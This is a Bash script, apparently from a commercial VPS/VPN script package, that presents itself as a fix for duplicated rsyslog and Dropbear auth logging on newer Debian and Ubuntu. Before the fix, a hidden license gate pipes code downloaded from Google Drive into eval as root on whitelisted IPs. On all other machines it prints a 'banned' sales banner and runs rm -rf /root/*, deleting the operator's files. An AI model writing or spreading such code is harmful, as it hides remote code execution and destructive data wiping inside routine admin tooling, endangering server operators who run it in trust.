#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep "$MYIP" | awk '{print $4}')
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
	ID_FILE="1kIvv6I1iiSlvL6sIdYYMXJ7TcBfdodxx"
	eval $(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")
    else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       AKSES DI TOLAK         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Masa Aktif Sudah Habis ⚠️\033[0m"
echo -e "  \033[0;33m💡 Beli izin resmi hanya dari Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://nevpn.site\033[0m"
echo -e "  \033[96m📱 WhatsApp: https://whatsapp.nevpn.site\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
	fi

cat > /root/auto-fix-logging.sh <<'EOF'
#!/bin/bash
set -Eeuo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "ERROR: Jalankan sebagai root."
  exit 1
fi
source /etc/os-release
OS_ID="${ID:-unknown}"
OS_VERSION="${VERSION_ID:-0}"
VERSION_NUM="${OS_VERSION%%.*}"

case "$OS_ID" in
  debian)
    if (( VERSION_NUM < 12 )); then
      echo "Info: OS Debian $OS_VERSION. Tidak perlu fix logging karena default sudah sesuai."
      exit 0
    fi
    ;;
  ubuntu)
    if (( VERSION_NUM < 24 )); then
      echo "Info: OS Ubuntu $OS_VERSION. Tidak perlu fix logging karena default sudah sesuai."
      exit 0
    fi
    ;;
  *)
    echo "OS tidak didukung: $OS_ID $OS_VERSION."
    exit 1
    ;;
esac

echo "OS terdeteksi: $OS_ID $OS_VERSION. Memulai penyesuaian log..."

if ! getent group adm >/dev/null; then
  groupadd --system adm
fi

if ! command -v rsyslogd >/dev/null 2>&1; then
  echo "Rsyslog tidak ditemukan. Menginstal rsyslog..."
  apt-get update -y
  apt-get install -y rsyslog
fi

BACKUP="/root/logging-backup-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$BACKUP"
[ -f /etc/rsyslog.conf ] && cp -a /etc/rsyslog.conf "$BACKUP/"
[ -d /etc/rsyslog.d ] && cp -a /etc/rsyslog.d "$BACKUP/"
echo "Backup tersimpan: $BACKUP"

echo "Membersihkan konfigurasi log ganda..."
rm -f /etc/rsyslog.d/30-local-logfiles.conf
sed -i '/include(file="\/etc\/rsyslog.d\/\*.conf" mode="optional")/d' /etc/rsyslog.conf

# 6. Pastikan modul input syslog tersedia
if ! grep -RqsE 'module\(load="imuxsock"' /etc/rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null; then
  cat > /etc/rsyslog.d/00-local-input.conf <<'CONF'
module(load="imuxsock")
CONF
fi

if ! grep -Eq '^(\$IncludeConfig[[:space:]]+|include\(file=)"?/etc/rsyslog\.d/\*\.conf"?' /etc/rsyslog.conf; then
  printf '\n$IncludeConfig /etc/rsyslog.d/*.conf\n' >> /etc/rsyslog.conf
fi

if grep -Eq '^[[:space:]]*if \$programname == "dropbear" then /var/log/auth\.log[[:space:]]*$' /etc/rsyslog.conf; then
  TMP_FILE="$(mktemp)"
  awk '
    /^[[:space:]]*if \$programname == "dropbear" then \/var\/log\/auth\.log[[:space:]]*$/ {
      getline nextline
      if (nextline !~ /^[[:space:]]*&[[:space:]]*stop[[:space:]]*$/)
        print nextline
      next
    }
    { print }
  ' /etc/rsyslog.conf > "$TMP_FILE"
  cat "$TMP_FILE" > /etc/rsyslog.conf
  rm -f "$TMP_FILE"
fi

if ! grep -Rqs 'programname.*dropbear' /etc/rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null; then
  cat > /etc/rsyslog.d/10-local-dropbear.conf <<'CONF'
if ($programname == "dropbear") then {
    action(type="omfile" file="/var/log/auth.log")
    stop
}
CONF
fi

LOG_FILES=(
  /var/log/auth.log
  /var/log/kern.log
  /var/log/mail.log
  /var/log/user.log
  /var/log/cron.log
  /var/log/syslog
)

for file in "${LOG_FILES[@]}"; do
  touch "$file"
  chown root:adm "$file"
  chmod 0640 "$file"
done
echo "[OK] Izin file log telah disesuaikan."
echo
echo "Memvalidasi konfigurasi..."
if ! rsyslogd -N1; then
  echo "ERROR: Validasi gagal."
  echo "Backup: $BACKUP"
  echo "Service tidak direstart oleh skrip."
  exit 1
fi

systemctl enable --now rsyslog
systemctl restart rsyslog
sleep 2

if ! systemctl is-active --quiet rsyslog; then
  echo "ERROR: rsyslog tidak aktif."
  journalctl -u rsyslog -n 30 --no-pager
  exit 1
fi

TEST_ID="AUTOLOG_TEST_$(date +%s)"
logger -p authpriv.notice "$TEST_ID"
sleep 3

echo
echo "===== HASIL PENGUJIAN ====="
LOG_COUNT=$(grep -c "$TEST_ID" /var/log/auth.log || true)
if [[ "$LOG_COUNT" -eq 1 ]]; then
  echo "[BERHASIL] auth.log menerima 1 pesan tes (TIDAK ADA DUPLIKASI)."
  grep -F "$TEST_ID" /var/log/auth.log
elif [[ "$LOG_COUNT" -gt 1 ]]; then
  echo "[PERINGATAN] auth.log menerima $LOG_COUNT pesan tes (MASIH DUPLIKAT)."
else
  echo "[PERINGATAN] Pesan tes belum ditemukan di auth.log."
fi

echo
echo "===== STATUS RSYSLOG ====="
systemctl --no-pager status rsyslog | grep Active

echo
echo "Selesai. Backup: $BACKUP"
EOF

chmod +x /root/auto-fix-logging.sh
bash /root/auto-fix-logging.sh
